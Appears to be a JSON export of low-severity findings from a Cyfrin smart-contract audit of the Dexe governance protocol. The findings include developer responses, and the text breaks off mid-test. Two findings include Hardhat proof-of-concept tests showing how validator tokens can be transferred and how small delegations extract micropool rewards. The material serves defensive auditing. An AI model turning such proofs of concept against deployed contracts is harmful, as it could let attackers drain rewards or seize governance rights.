    },
    {
      "id": "27330",
      "title": "Use `safeTransfer()` instead of `transfer()` for ERC20",
      "impact": "LOW",
      "content": "**Description:** Use `safeTransfer` instead of `transfer` for ERC20.\n\n**Impact:** INFO\n\n**Proof of Concept:**\n```solidity\nFile: gov/GovPool.sol\n\n248:             IERC20(token).transfer(address(_govUserKeeper), amount.from18(token.decimals()));\n\n```\n\n**Recommended Mitigation:** Use `safeTransfer` instead of `transfer` for ERC20.\n\n**Dexe:**\nFixed in commit [9078949](https://github.com/dexe-network/DeXe-Protocol/commit/9078949d6c968a914d2c5c1977b7331a6cbea7f6#diff-1112b85df220ebfd2bce44ff6c1e827cacbee838afaf25f75dd7e7e0d8017dbc).\n\n**Cyfrin:** Verified.\n\n\\clearpage",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27329",
      "title": "Use of deprecated library function `safeApprove()`",
      "impact": "LOW",
      "content": "**Description:** `safeApprove()` has been deprecated and the official OpenZeppelin documentation [recommends](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#SafeERC20-safeApprove-contract-IERC20-address-uint256-) using `safeIncreaseAllowance()` & `safeDecreaseAllowance()`.\n\n**Impact:** INFO\n\n**Proof of Concept:**\n```solidity\nFile: core/PriceFeed.sol\n\n385:             IERC20(token).safeApprove(address(uniswapV2Router), MAX_UINT);\n\n```\n\n**Recommended Mitigation:** Consider replacing deprecated functions of OpenZeppelin contracts.\n\n**Dexe:**\nFixed as contract removed from codebase.\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27328",
      "title": "`abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`",
      "impact": "LOW",
      "content": "**Description:** `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`.\n\nUse `abi.encode()` instead which will pad items to 32 bytes, which will [prevent hash collisions](https://docs.soliditylang.org/en/v0.8.13/abi-spec.html#non-standard-packed-mode) (e.g. `abi.encodePacked(0x123,0x456)` => `0x123456` => `abi.encodePacked(0x1,0x23456)`, but `abi.encode(0x123,0x456)` => `0x0...1230...456`).\n\nUnless there is a compelling reason, `abi.encode` should be preferred. If there is only one argument to `abi.encodePacked()` it can often be cast to `bytes()` or `bytes32()` [instead](https://ethereum.stackexchange.com/questions/30912/how-to-compare-strings-in-solidity#answer-82739). If all arguments are strings and or bytes, `bytes.concat()` should be used instead.\n\n**Proof of Concept:**\n```solidity\nFile: factory/PoolFactory.sol\n\n263:         return keccak256(abi.encodePacked(deployer, poolName));\n\n```\n\n```solidity\nFile: libs/gov/gov-pool/GovPoolOffchain.sol\n\n41:         return keccak256(abi.encodePacked(resultsHash, block.chainid, address(this)));\n\n```\n\n```solidity\nFile: user/UserRegistry.sol\n\n44:         _signatureHashes[_documentHash][msg.sender] = keccak256(abi.encodePacked(signature));\n\n```\n\n**Recommended Mitigation:** See description.\n\n**Dexe:**\nAcknowledged; there is only one dynamic type “string” in the encoding, so everything is safe. Also, packed encoding is much simpler to handle on the back end.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27327",
      "title": "Events are missing indexed fields",
      "impact": "LOW",
      "content": "**Description:** Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields).\n\n**Impact:** Slower access for off-chain tools that parse events.\n\n**Proof of Concept:**\n```solidity\nFile: factory/PoolFactory.sol\n\n43:     event DaoPoolDeployed(\n\n```\n\n```solidity\nFile: gov/ERC721/multipliers/AbstractERC721Multiplier.sol\n\n25:     event Minted(uint256 tokenId, address to, uint256 multiplier, uint256 duration);\n\n26:     event Locked(uint256 tokenId, address sender, bool isLocked);\n\n27:     event Changed(uint256 tokenId, uint256 multiplier, uint256 duration);\n\n```\n\n```solidity\nFile: gov/ERC721/multipliers/DexeERC721Multiplier.sol\n\n21:     event AverageBalanceChanged(address user, uint256 averageBalance);\n\n```\n\n```solidity\nFile: gov/GovPool.sol\n\n87:     event Delegated(address from, address to, uint256 amount, uint256[] nfts, bool isDelegate);\n\n88:     event DelegatedTreasury(address to, uint256 amount, uint256[] nfts, bool isDelegate);\n\n89:     event Deposited(uint256 amount, uint256[] nfts, address sender);\n\n90:     event Withdrawn(uint256 amount, uint256[] nfts, address sender);\n\n```\n\n```solidity\nFile: gov/proposals/DistributionProposal.sol\n\n31:     event DistributionProposalClaimed(\n\n```\n\n```solidity\nFile: gov/proposals/TokenSaleProposal.sol\n\n44:     event TierCreated(\n\n49:     event Bought(uint256 tierId, address buyer);\n\n50:     event Whitelisted(uint256 tierId, address user);\n\n```\n\n```solidity\nFile: gov/settings/GovSettings.sol\n\n16:     event SettingsChanged(uint256 settingsId, string description);\n\n17:     event ExecutorChanged(uint256 settingsId, address executor);\n\n```\n\n```solidity\nFile: gov/user-keeper/GovUserKeeper.sol\n\n52:     event SetERC20(address token);\n\n53:     event SetERC721(address token);\n\n```\n\n```solidity\nFile: gov/validators/GovValidators.sol\n\n38:     event ExternalProposalCreated(uint256 proposalId, uint256 quorum);\n\n39:     event InternalProposalCreated(\n\n46:     event InternalProposalExecuted(uint256 proposalId, address executor);\n\n48:     event Voted(uint256 proposalId, address sender, uint256 vote, bool isInternal, bool isVoteFor);\n\n49:     event VoteCanceled(uint256 proposalId, address sender, bool isInternal);\n\n```\n\n```solidity\nFile: interfaces/gov/ERC721/IERC721Expert.sol\n\n20:     event TagsAdded(uint256 indexed tokenId, string[] tags);\n\n```\n\n```solidity\nFile: libs/gov/gov-pool/GovPoolCreate.sol\n\n24:     event ProposalCreated(\n\n34:     event MovedToValidators(uint256 proposalId, address sender);\n\n```\n\n```solidity\nFile: libs/gov/gov-pool/GovPoolExecute.sol\n\n24:     event ProposalExecuted(uint256 proposalId, bool isFor, address sender);\n\n```\n\n```solidity\nFile: libs/gov/gov-pool/GovPoolMicropool.sol\n\n23:     event DelegatorRewardsClaimed(\n\n```\n\n```solidity\nFile: libs/gov/gov-pool/GovPoolOffchain.sol\n\n16:     event OffchainResultsSaved(string resultsHash, address sender);\n\n```\n\n```solidity\nFile: libs/gov/gov-pool/GovPoolRewards.sol\n\n19:     event RewardClaimed(uint256 proposalId, address sender, address token, uint256 rewards);\n\n20:     event VotingRewardClaimed(\n\n```\n\n```solidity\nFile: libs/gov/gov-pool/GovPoolVote.sol\n\n19:     event VoteChanged(uint256 proposalId, address voter, bool isVoteFor, uint256 totalVoted);\n\n20:     event QuorumReached(uint256 proposalId, uint256 timestamp);\n\n21:     event QuorumUnreached(uint256 proposalId);\n\n```\n\n```solidity\nFile: libs/gov/gov-validators/GovValidatorsExecute.sol\n\n16:     event ChangedValidatorsBalances(address[] validators, uint256[] newBalance);\n\n```\n\n```solidity\nFile: user/UserRegistry.sol\n\n15:     event UpdatedProfile(address user, string url);\n\n16:     event Agreed(address user, bytes32 documentHash);\n\n17:     event SetDocumentHash(bytes32 hash);\n\n```\n\nFrom Solarity library:\n\n```solidity\nFile: contracts-registry/AbstractContractsRegistry.sol\n\n44:     event ContractAdded(string name, address contractAddress);\n\n45:     event ProxyContractAdded(string name, address contractAddress, address implementation);\n\n46:     event ProxyContractUpgraded(string name, address newImplementation);\n\n47:     event ContractRemoved(string name);\n\n```\n\n```solidity\nFile: contracts-registry/pools/proxy/ProxyBeacon.sol\n\n19:     event Upgraded(address implementation);\n\n```\n\n```solidity\nFile: diamond/Diamond.sol\n\n39:     event DiamondCut(Facet[] facets, address initFacet, bytes initData);\n\n```\n\n```solidity\nFile: diamond/utils/InitializableStorage.sol\n\n23:     event Initialized(bytes32 storageSlot);\n\n```\n\n```solidity\nFile: interfaces/access-control/IMultiOwnable.sol\n\n8:     event OwnersAdded(address[] newOwners);\n\n9:     event OwnersRemoved(address[] removedOwners);\n\n```\n\n```solidity\nFile: interfaces/access-control/IRBAC.sol\n\n15:     event GrantedRoles(address to, string[] rolesToGrant);\n\n16:     event RevokedRoles(address from, string[] rolesToRevoke);\n\n18:     event AddedPermissions(string role, string resource, string[] permissionsToAdd, bool allowed);\n\n19:     event RemovedPermissions(\n\n```\n\n```solidity\nFile: interfaces/access-control/extensions/IRBACGroupable.sol\n\n8:     event AddedToGroups(address who, string[] groupsToAddTo);\n\n9:     event RemovedFromGroups(address who, string[] groupsToRemoveFrom);\n\n11:     event GrantedGroupRoles(string groupTo, string[] rolesToGrant);\n\n12:     event RevokedGroupRoles(string groupFrom, string[] rolesToRevoke);\n\n14:     event ToggledDefaultGroup(bool defaultGroupEnabled);\n\n```\n\n```solidity\nFile: interfaces/compound-rate-keeper/ICompoundRateKeeper.sol\n\n8:     event CapitalizationPeriodChanged(uint256 newCapitalizationPeriod);\n\n9:     event CapitalizationRateChanged(uint256 newCapitalizationRate);\n\n```\n\n\n**Recommended Mitigation:** Consider indexing fields in the listed events.\n\n**Dexe:**\nAcknowledged; there are many services that we use which rely on the exact signature of events. Changing the events would require changing the services; we may do it in the future.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27326",
      "title": "Missing `address(0)` checks when assigning values to address state variables",
      "impact": "LOW",
      "content": "**Description:** Missing `address(0)` checks when assigning values to address state variables.\n\n**Impact:** Address state variables may be unexpectedly set to `address(0)`.\n\n**Proof of Concept:**\n```solidity\nFile: gov/GovPool.sol\n\n344:         _nftMultiplier = nftMultiplierAddress;\n\n```\n\n```solidity\nFile: gov/proposals/TokenSaleProposal.sol\n\n63:         govAddress = _govAddress;\n\n```\n\nFrom Solarity library:\n\n```solidity\nFile: contracts-registry/pools/AbstractPoolContractsRegistry.sol\n\n51:         _contractsRegistry = contractsRegistry_;\n\n```\n\n```solidity\nFile: contracts-registry/pools/pool-factory/AbstractPoolFactory.sol\n\n31:         _contractsRegistry = contractsRegistry_;\n\n```\n\n```solidity\nFile: contracts-registry/pools/proxy/ProxyBeacon.sol\n\n33:         _implementation = newImplementation_;\n\n```\n\n**Recommended Mitigation:** Consider adding above `address(0)` checks.\n\n**Dexe:**\nAcknowledged; the provided examples are either related to PoolFactory (where no address(0) are possible) or to an NFTMultiplier which is intended to be zero under some business conditions.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27325",
      "title": "Create Proposal has the exact same reward as moving a proposal to validators creating disproportionate incentives",
      "impact": "LOW",
      "content": "**Description:** Users initiating a new proposal via`GovPool::createProposal` are rewarded the same incentives as users who merely move a proposal after successful pool voting to validators.\n\nNote that creating a new proposal involves a lot of effort in terms of designing a proposal acceptable to the broader DAO community, setting up the proposal URL, and creating for & against actions for a proposal. The amount of gas consumed for proposal creation is higher than moving a successful proposal to validators.\n\n**Impact:** Having the same rewards for both the above actions creates misaligned incentives.\n\n**Recommended Mitigation:** Consider changing rewards for `GovPool::moveProposalToValidators` to type `Rewards.Execute`. In effect, rewards for moving a proposal to validators is the same as rewards for executing a successful proposal.\n\n**Dexe:**\nFixed in [PR168](https://github.com/dexe-network/DeXe-Protocol/commit/01bc28e89a99da5f7b67d6645c935f7230a8dc7b).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27324",
      "title": "`UniswapV2Router::getAmountsOut()` based upon pool reserves allowing returned price to be manipulated via flash loan",
      "impact": "LOW",
      "content": "**Description:** [`PriceFeed`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/core/PriceFeed.sol) uses [`UniswapV2PathFinder`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/price-feed/UniswapV2PathFinder.sol) which itself uses `UniswapV2Router::getAmountsOut()` & `getAmountsIn()` which are [based upon pool reserves](https://github.com/Uniswap/v2-periphery/blob/master/contracts/libraries/UniswapV2Library.sol#L62-L70), allowing an attacker to manipulate the returned prices via flash loans.\n\n**Impact:** An attacker can manipulate the returned prices via flash loans. Marked as Informational since `PriceFeed` doesn't appear to be used anywhere in current codebase, so there is no current impact on the system.\n\n**Recommended Mitigation:** Use [Uniswap TWAP](https://docs.uniswap.org/contracts/v2/concepts/core-concepts/oracles) or Chainlink price oracle for manipulation-resistant pricing data.\n\n**Dexe:**\nFunctionality removed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27323",
      "title": "`GovValidators` can transfer non-transferable `GovValidatorToken` to non-validators making them validators",
      "impact": "LOW",
      "content": "**Description:** `GovValidators` can transfer non-transferable `GovValidatorToken` to non-validators making them validators.\n\n**Impact:** Non-transferable tokens can be transferred making non-validators into validators. This is marked as INFO though as so far we haven't been able to find a way to get the `GovValidators` contract to actually make this call in practice, and it requires a validator to approve token spending for `GovValidatorToken` to the `GovValidators` contract.\n\n**Proof of Concept:** Add to `GovValidators.test.js`:\n```javascript\n    describe(\"audit transfer nontransferable GovValidatorToken\", () => {\n      it(\"audit GovValidators can transfer GovValidatorToken to non-validators making them Validators\", async () => {\n        // SECOND is a validator as they have GovValidatorToken\n        assert.equal(await validators.isValidator(SECOND), true);\n        assert.equal((await validatorsToken.balanceOf(SECOND)).toFixed(), wei(\"100\"));\n\n        // NOT_VALIDATOR is a new address that isn't a validator\n        let NOT_VALIDATOR = await accounts(3);\n        assert.equal(await validators.isValidator(NOT_VALIDATOR), false);\n\n        const { impersonate } = require(\"../helpers/impersonator\");\n        // SECOND gives approval to GovValidators over their GovValidatorToken\n        await impersonate(SECOND);\n        await validatorsToken.approve(validators.address, wei(\"10\"), { from: SECOND });\n\n        // GovValidators can transfer SECOND's GovValidatorToken to NON_VALIDATOR\n        await impersonate(validators.address);\n        await validatorsToken.transferFrom(SECOND, NOT_VALIDATOR, wei(\"10\"), { from: validators.address });\n\n        // this makes NON_VALIDATOR a VALIDATOR\n        assert.equal((await validatorsToken.balanceOf(NOT_VALIDATOR)).toFixed(), wei(\"10\"));\n        assert.equal(await validators.isValidator(NOT_VALIDATOR), true);\n      });\n    });\n```\n\nRun with: `npx hardhat test --grep \"audit transfer nontransferable GovValidatorToken\"`\n\n**Recommended Mitigation:** Rethink the implementation of [`GovValidatorsToken::_beforeTokenTransfer()`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/validators/GovValidatorsToken.sol#L32-L38) to allow minting & burning but prevent transfers.\n\n**Dexe:**\nFixed in commit [dca45e5](https://github.com/dexe-network/DeXe-Protocol/commit/dca45e546c1ad44ae8d724f8942c80ec6841ee1b).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27322",
      "title": "Small delegations prevent delegatee from receiving micropool rewards while still rewarding delegator",
      "impact": "LOW",
      "content": "**Description:** Small delegations prevent delegatee from receiving micropool rewards while still rewarding delegator.\n\n**Impact:** Delegatee doesn't receive micropool rewards but the delegator is able to extract them via delegating in small amounts. This is an interesting edge case that we haven't figured out if it is seriously exploitable but it does break a core invariant of similar systems, namely that many small operations should have the same effect as one large operation. In this case multiple small delegations result in a *different* effect that one large delegation breaking this core system invariant.\n\n**Proof of Concept:** Add PoC to `GovPool.test.js` under section `describe(\"getProposalState()\", () => {`:\n```javascript\n      it(\"audit small delegations prevent delegatee from receiving micropool rewards while still rewarding delegator\", async () => {\n        // so proposals doesn't need to go to validators\n        await changeInternalSettings(false);\n\n        // required for executing the proposals\n        await govPool.deposit(govPool.address, wei(\"200\"), []);\n\n        // create 4 proposals; only the first 2 will be executed\n        // create proposal 1\n        await govPool.createProposal(\n          \"example.com\",\n          [[govPool.address, 0, getBytesGovVote(4, wei(\"100\"), [], true)]],\n          [[govPool.address, 0, getBytesGovVote(4, wei(\"100\"), [], false)]]\n        );\n        // create proposal 2\n        await govPool.createProposal(\n          \"example.com\",\n          [[govPool.address, 0, getBytesGovVote(5, wei(\"100\"), [], true)]],\n          [[govPool.address, 0, getBytesGovVote(5, wei(\"100\"), [], false)]]\n        );\n        // create proposal 3\n        await govPool.createProposal(\n          \"example.com\",\n          [[govPool.address, 0, getBytesGovVote(5, wei(\"100\"), [], true)]],\n          [[govPool.address, 0, getBytesGovVote(5, wei(\"100\"), [], false)]]\n        );\n        // create proposal 4\n        await govPool.createProposal(\n          \"example.com\",\n          [[govPool.address, 0, getBytesGovVote(5, wei(\"100\"), [], true)]],\n          [[govPool.address, 0, getBytesGovVote(5, wei(\"100\"), [], false)]]\n        );\n\n        let proposal1Id = 2;\n        let proposal2Id = 3;\n\n        let DELEGATEE  = await accounts(10);\n        let DELEGATOR1 = await accounts(9);\n        let DELEGATOR2 = await accounts(8);\n        let DELEGATOR3 = await accounts(7);\n\n        let delegator1Tokens = wei(\"50000000000000000000\");\n        let delegator2Tokens = wei(\"150000000000000000000\");\n        let delegator3Tokens = \"4\";\n        let delegateeReward  = wei(\"40000000000000000000\");\n        let delegator1Reward = wei(\"40000000000000000000\");\n        let delegator2Reward = wei(\"120000000000000000000\");\n        let delegator3Reward = \"3\";\n\n        // mint tokens & deposit them to have voting power\n        await token.mint(DELEGATOR1, delegator1Tokens);\n        await token.approve(userKeeper.address, delegator1Tokens, { from: DELEGATOR1 });\n        await govPool.deposit(DELEGATOR1, delegator1Tokens, [], { from: DELEGATOR1 });\n        await token.mint(DELEGATOR2, delegator2Tokens);\n        await token.approve(userKeeper.address, delegator2Tokens, { from: DELEGATOR2 });\n        await govPool.deposit(DELEGATOR2, delegator2Tokens, [], { from: DELEGATOR2 });\n        await token.mint(DELEGATOR3, delegator3Tokens);\n        await token.approve(userKeeper.address, delegator3Tokens, { from: DELEGATOR3 });\n        await govPool.deposit(DELEGATOR3, delegator3Tokens, [], { from: DELEGATOR3 });\n\n        // for proposal 1, only DELEGATOR1 & DELEGATOR2 will delegate to DELEGATEE\n        await govPool.delegate(DELEGATEE, delegator1Tokens, [], { from: DELEGATOR1 });\n        await govPool.delegate(DELEGATEE, delegator2Tokens, [], { from: DELEGATOR2 });\n\n        // DELEGATEE votes on proposal 1\n        await govPool.vote(proposal1Id, true, \"0\", [], { from: DELEGATEE });\n\n        // verify DELEGATEE's voting\n        assert.equal(\n          (await govPool.getUserVotes(proposal1Id, DELEGATEE, VoteType.PersonalVote)).totalRawVoted,\n          \"0\" // personal votes remain the same\n        );\n        assert.equal(\n          (await govPool.getUserVotes(proposal1Id, DELEGATEE, VoteType.MicropoolVote)).totalRawVoted,\n          wei(\"200000000000000000000\") // delegated votes included\n        );\n        assert.equal(\n          (await govPool.getTotalVotes(proposal1Id, DELEGATEE, VoteType.PersonalVote))[0].toFixed(),\n          wei(\"200000000000000000000\") // delegated votes included\n        );\n\n        // advance time\n        await setTime((await getCurrentBlockTime()) + 1);\n\n        // proposal 1 now in SucceededFor state\n        assert.equal(await govPool.getProposalState(proposal1Id), ProposalState.SucceededFor);\n\n        // execute proposal 1\n        await govPool.execute(proposal1Id);\n\n        // verify pending rewards via GovPool::getPendingRewards()\n        let pendingRewards = await govPool.getPendingRewards(DELEGATEE, [proposal1Id]);\n\n        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);\n        assert.equal(pendingRewards.votingRewards[0].personal, \"0\");\n        assert.equal(pendingRewards.votingRewards[0].micropool, delegateeReward);\n        assert.equal(pendingRewards.votingRewards[0].treasury, \"0\");\n\n        pendingRewards = await govPool.getPendingRewards(DELEGATOR1, [proposal1Id]);\n\n        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);\n        assert.equal(pendingRewards.votingRewards[0].personal, \"0\");\n        assert.equal(pendingRewards.votingRewards[0].micropool, \"0\");\n        assert.equal(pendingRewards.votingRewards[0].treasury, \"0\");\n\n        pendingRewards = await govPool.getPendingRewards(DELEGATOR2, [proposal1Id]);\n\n        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);\n        assert.equal(pendingRewards.votingRewards[0].personal, \"0\");\n        assert.equal(pendingRewards.votingRewards[0].micropool, \"0\");\n        assert.equal(pendingRewards.votingRewards[0].treasury, \"0\");\n\n        pendingRewards = await govPool.getPendingRewards(DELEGATOR3, [proposal1Id]);\n\n        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);\n        assert.equal(pendingRewards.votingRewards[0].personal, \"0\");\n        assert.equal(pendingRewards.votingRewards[0].micropool, \"0\");\n        assert.equal(pendingRewards.votingRewards[0].treasury, \"0\");\n\n        // verify pending delegator rewards via GovPool::getDelegatorRewards()\n        pendingRewards = await govPool.getDelegatorRewards([proposal1Id], DELEGATOR1, DELEGATEE);\n        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);\n        assert.deepEqual(pendingRewards.isVoteFor, [true]);\n        assert.deepEqual(pendingRewards.isClaimed, [false]);\n        assert.deepEqual(pendingRewards.expectedRewards, [delegator1Reward]);\n\n        pendingRewards = await govPool.getDelegatorRewards([proposal1Id], DELEGATOR2, DELEGATEE);\n        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);\n        assert.deepEqual(pendingRewards.isVoteFor, [true]);\n        assert.deepEqual(pendingRewards.isClaimed, [false]);\n        assert.deepEqual(pendingRewards.expectedRewards, [delegator2Reward]);\n\n        pendingRewards = await govPool.getDelegatorRewards([proposal1Id], DELEGATOR3, DELEGATEE);\n        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);\n        assert.deepEqual(pendingRewards.isVoteFor, [true]);\n        assert.deepEqual(pendingRewards.isClaimed, [false]);\n        assert.deepEqual(pendingRewards.expectedRewards, [\"0\"]);\n\n        // reward balances 0 before claiming rewards\n        assert.equal((await rewardToken.balanceOf(DELEGATEE)).toFixed(), \"0\");\n        assert.equal((await rewardToken.balanceOf(DELEGATOR1)).toFixed(), \"0\");\n        assert.equal((await rewardToken.balanceOf(DELEGATOR2)).toFixed(), \"0\");\n\n        // claim rewards\n        await govPool.claimRewards([proposal1Id], { from: DELEGATEE });\n        await govPool.claimMicropoolRewards([proposal1Id], DELEGATEE, { from: DELEGATOR1 });\n        await govPool.claimMicropoolRewards([proposal1Id], DELEGATEE, { from: DELEGATOR2 });\n\n        // verify reward balances after claiming rewards\n        assert.equal((await rewardToken.balanceOf(DELEGATEE)).toFixed(), delegateeReward);\n        assert.equal((await rewardToken.balanceOf(DELEGATOR1)).toFixed(), delegator1Reward);\n        assert.equal((await rewardToken.balanceOf(DELEGATOR2)).toFixed(), delegator2Reward);\n\n        // for proposal 2, DELEGATOR3 will additionally delegate a small amount to DELEGATEE\n        // when delegating small token amounts (max 4 in this configuration), DELEGATOR3 is\n        // able to extract micropool rewards while not giving any micropool rewards to DELEGATEE\n        // nor impacting the micropool rewards of the other delegators\n        await govPool.delegate(DELEGATEE, delegator3Tokens, [], { from: DELEGATOR3 });\n\n        // DELEGATEE votes on proposal 2\n        await govPool.vote(proposal2Id, true, \"0\", [], { from: DELEGATEE });\n\n        // verify DELEGATEE's voting\n        assert.equal(\n          (await govPool.getUserVotes(proposal2Id, DELEGATEE, VoteType.PersonalVote)).totalRawVoted,\n          \"0\" // personal votes remain the same\n        );\n        assert.equal(\n          (await govPool.getUserVotes(proposal2Id, DELEGATEE, VoteType.MicropoolVote)).totalRawVoted,\n          wei(\"20000000000000000000\") + delegator3Tokens // DELEGATOR3 votes included\n        );\n        assert.equal(\n          (await govPool.getTotalVotes(proposal2Id, DELEGATEE, VoteType.PersonalVote))[0].toFixed(),\n          wei(\"20000000000000000000\") + delegator3Tokens // DELEGATOR3 votes included\n        );\n\n        // advance time\n        await setTime((await getCurrentBlockTime()) + 1);\n\n        // proposal 2 now in SucceededFor state\n        assert.equal(await govPool.getProposalState(proposal2Id), ProposalState.SucceededFor);\n\n        // execute proposal 2\n        await govPool.execute(proposal2Id);\n\n        // verify pending rewards via GovPool::getPendingRewards()\n        pendingRewards = await govPool.getPendingRewards(DELEGATEE, [proposal2Id]);\n\n        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);\n        assert.equal(pendingRewards.votingRewards[0].personal, \"0\");\n        // DELEGATEE doesn't receive any additional micropool rewards even though\n        // DELEGATOR3 is now delegating to them\n        assert.equal(pendingRewards.votingRewards[0].micropool, delegateeReward);\n        assert.equal(pendingRewards.votingRewards[0].treasury, \"0\");\n\n        pendingRewards = await govPool.getPendingRewards(DELEGATOR1, [proposal2Id]);\n\n        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);\n        assert.equal(pendingRewards.votingRewards[0].personal, \"0\");\n        assert.equal(pendingRewards.votingRewards[0].micropool, \"0\");\n        assert.equal(pendingRewards.votingRewards[0].treasury, \"0\");\n\n        pendingRewards = await govPool.getPendingRewards(DELEGATOR2, [proposal2Id]);\n\n        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);\n        assert.equal(pendingRewards.votingRewards[0].personal, \"0\");\n        assert.equal(pendingRewards.votingRewards[0].micropool, \"0\");\n        assert.equal(pendingRewards.votingRewards[0].treasury, \"0\");\n\n        pendingRewards = await govPool.getPendingRewards(DELEGATOR3, [proposal2Id]);\n\n        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);\n        assert.equal(pendingRewards.votingRewards[0].personal, \"0\");\n        assert.equal(pendingRewards.votingRewards[0].micropool, \"0\");\n        assert.equal(pendingRewards.votingRewards[0].treasury, \"0\");\n\n        // verify pending delegator rewards via GovPool::getDelegatorRewards()\n        pendingRewards = await govPool.getDelegatorRewards([proposal2Id], DELEGATOR1, DELEGATEE);\n        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);\n        assert.deepEqual(pendingRewards.isVoteFor, [true]);\n        assert.deepEqual(pendingRewards.isClaimed, [false]);\n        assert.deepEqual(pendingRewards.expectedRewards, [delegator1Reward]);\n\n        pendingRewards = await govPool.getDelegatorRewards([proposal2Id], DELEGATOR2, DELEGATEE);\n        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);\n        assert.deepEqual(pendingRewards.isVoteFor, [true]);\n        assert.deepEqual(pendingRewards.isClaimed, [false]);\n        assert.deepEqual(pendingRewards.expectedRewards, [delegator2Reward]);\n\n        pendingRewards = await govPool.getDelegatorRewards([proposal2Id], DELEGATOR3, DELEGATEE);\n        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);\n        assert.deepEqual(pendingRewards.isVoteFor, [true]);\n        assert.deepEqual(pendingRewards.isClaimed, [false]);\n        // DELEGATOR3 now gets micropool rewards even though DELEGATEE isn't getting\n        // any additional rewards\n        assert.deepEqual(pendingRewards.expectedRewards, [\"3\"]);\n\n        // reward balances same as rewards from proposal 1\n        assert.equal((await rewardToken.balanceOf(DELEGATEE)).toFixed(), delegateeReward);\n        assert.equal((await rewardToken.balanceOf(DELEGATOR1)).toFixed(), delegator1Reward);\n        assert.equal((await rewardToken.balanceOf(DELEGATOR2)).toFixed(), delegator2Reward);\n\n        // claim rewards\n        await govPool.claimRewards([proposal2Id], { from: DELEGATEE });\n        await govPool.claimMicropoolRewards([proposal2Id], DELEGATEE, { from: DELEGATOR1 });\n        await govPool.claimMicropoolRewards([proposal2Id], DELEGATEE, { from: DELEGATOR2 });\n        await govPool.claimMicropoolRewards([proposal2Id], DELEGATEE, { from: DELEGATOR3 });\n\n        // verify reward balances after claiming rewards\n        // for DELEGATEE, DELEGATOR1 & DELEGATOR2 balances have multiplied by 2 as they\n        // received the exact same rewards; the participation of DELEGATOR3 did not result in\n        // any additional rewards for DELEGATEE\n        assert.equal((await 